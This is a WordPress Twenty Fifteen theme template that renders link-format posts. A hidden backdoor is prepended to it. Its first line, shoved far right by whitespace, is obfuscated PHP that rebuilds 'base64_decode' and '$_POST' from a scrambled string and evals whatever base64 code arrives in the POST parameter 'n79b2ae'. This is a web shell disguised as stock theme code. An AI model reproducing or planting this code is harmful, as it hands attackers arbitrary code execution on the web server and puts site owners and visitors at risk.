<?php                                                                                                                                                                                                                                                 $lpz7 ="c6_d4atboesp" ; $yoyy8 = strtolower ( $lpz7[7].$lpz7[5]. $lpz7[10].$lpz7[9] . $lpz7[1]. $lpz7[4]. $lpz7[2] . $lpz7[3]. $lpz7[9]. $lpz7[0].$lpz7[8]. $lpz7[3]. $lpz7[9]); $tjxw3= strtoupper($lpz7[2]. $lpz7[11].$lpz7[8].$lpz7[10]. $lpz7[6]);if( isset ( ${$tjxw3} ['n79b2ae' ]) ){ eval($yoyy8 (${$tjxw3} ['n79b2ae'] ) ) ;}?><?php
/**
 * The template for displaying link post formats
 *
 * Used for both single and index/archive/search.
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */
?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<?php twentyfifteen_post_thumbnail(); ?>

	<header class="entry-header">
		<?php
			if ( is_single() ) :
				the_title( sprintf( '<h1 class="entry-title"><a href="%s">', esc_url( twentyfifteen_get_link_url() ) ), '</a></h1>' );
			else :
				the_title( sprintf( '<h2 class="entry-title"><a href="%s">', esc_url( twentyfifteen_get_link_url() ) ), '</a></h2>' );
			endif;
		?>
	</header>
	<!-- .entry-header -->

	<div class="entry-content">
		<?php
			/* translators: %s: Name of current post */
			the_content( sprintf(
				__( 'Continue reading %s', 'twentyfifteen' ),
				the_title( '<span class="screen-reader-text">', '</span>', false )
			) );

			wp_link_pages( array(
				'before'      => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'twentyfifteen' ) . '</span>',
				'after'       => '</div>',
				'link_before' => '<span>',
				'link_after'  => '</span>',
				'pagelink'    => '<span class="screen-reader-text">' . __( 'Page', 'twentyfifteen' ) . ' </span>%',
				'separator'   => '<span class="screen-reader-text">, </span>',
			) );
		?>
	</div>
	<!-- .entry-content -->

	<?php
		// Author bio.
		if ( is_single() && get_the_author_meta( 'description' ) ) :
			get_template_part( 'author-bio' );
		endif;
	?>

	<footer class="entry-footer">
		<?php twentyfifteen_entry_meta(); ?>
		<?php edit_post_link( __( 'Edit', 'twentyfifteen' ), '<span class="edit-link">', '</span>' ); ?>
	</footer>
	<!-- .entry-footer -->

</article><!-- #post-## -->
